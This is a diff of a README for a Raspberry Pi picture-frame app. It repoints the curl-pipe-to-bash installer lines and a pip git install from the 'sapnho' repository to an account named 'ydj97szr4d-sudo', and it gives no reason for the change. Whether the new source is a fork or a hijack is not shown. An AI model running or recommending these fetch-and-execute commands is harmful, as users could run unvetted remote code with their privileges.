@@ -40,7 +40,7 @@ Use **Raspberry Pi Imager**.
 
 ```bash
 ssh pi@frame.local
-curl -fsSL https://raw.githubusercontent.com/sapnho/Digital-Picture-Frame-Pi-2026/main/packaging/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026/main/packaging/install.sh | bash
 ```
 
 *(Prefer to read it first? `curl -fsSL … -o install.sh && less install.sh && bash install.sh`.)*
@@ -113,7 +113,7 @@ sudo usermod -aG video,render,input "$USER"
 
 python3 -m venv --system-site-packages ~/.local/share/picframe3/venv
 ~/.local/share/picframe3/venv/bin/pip install \
-  "git+https://github.com/sapnho/Digital-Picture-Frame-Pi-2026#egg=picframe3[all]"
+  "git+https://github.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026#egg=picframe3[all]"
 sudo ln -sfn ~/.local/share/picframe3/venv/bin/picframe3 /usr/local/bin/picframe3
 
 picframe3 setup
@@ -317,7 +317,7 @@ Re-run the installer — it upgrades in place and leaves your configuration
 alone:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/sapnho/Digital-Picture-Frame-Pi-2026/main/packaging/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026/main/packaging/install.sh | bash
 sudo systemctl restart picframe3@pi
 ```
 
